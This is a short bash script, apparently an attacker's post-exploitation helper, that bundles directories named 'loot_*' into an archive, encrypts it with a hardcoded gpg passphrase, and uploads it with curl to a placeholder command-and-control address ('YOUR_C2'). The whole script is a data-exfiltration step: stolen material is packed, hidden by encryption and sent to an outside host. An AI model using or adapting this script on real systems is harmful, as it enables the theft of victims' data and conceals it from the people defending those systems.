#!/bin/bash
# Encrypt all loot before exfil
tar -czf loot.tar.gz loot_*/
gpg --symmetric --cipher-algo AES256 --passphrase "SIAK2024!" loot.tar.gz
curl -T loot.tar.gz.gpg http://YOUR_C2/upload